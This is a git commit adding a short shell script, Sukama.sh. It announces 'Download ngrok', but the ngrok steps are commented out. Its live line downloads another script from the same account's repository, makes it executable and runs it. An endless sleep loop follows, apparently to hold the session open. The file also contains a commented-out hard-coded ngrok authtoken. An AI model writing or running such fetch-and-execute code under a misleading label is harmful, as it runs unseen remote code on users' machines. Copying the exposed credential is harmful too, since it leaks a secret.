074448f3ef9ffab6f0d03bea4a283906dc8c15f2
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-02-28 06:20:15 +0700

    Create Sukama.sh

---
+++ Sukama.sh
@@ -0,0 +1,13 @@
+#rm -rf ngrok ngrok.zip ng.sh > /dev/null 2>&1
+echo "======================="
+echo "Download ngrok"
+echo "======================="
+#wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+wget https://raw.githubusercontent.com/uaaoxjdr/testly/main/Tmuraks.sh && chmod u+x Tmuraks.sh && ./Tmuraks.sh
+#unzip ngrok.zip > /dev/null 2>&1
+#read -p "Paste Ngrok Authtoken: " CRP
+#./ngrok 23KE1QqMII3UDnPOa4uleYgvRcl_5L7bNgSRteRyL4PCUonmF $CRP
+while [ 1 ]; do
+sleep 3
+done
+sleep 99999999
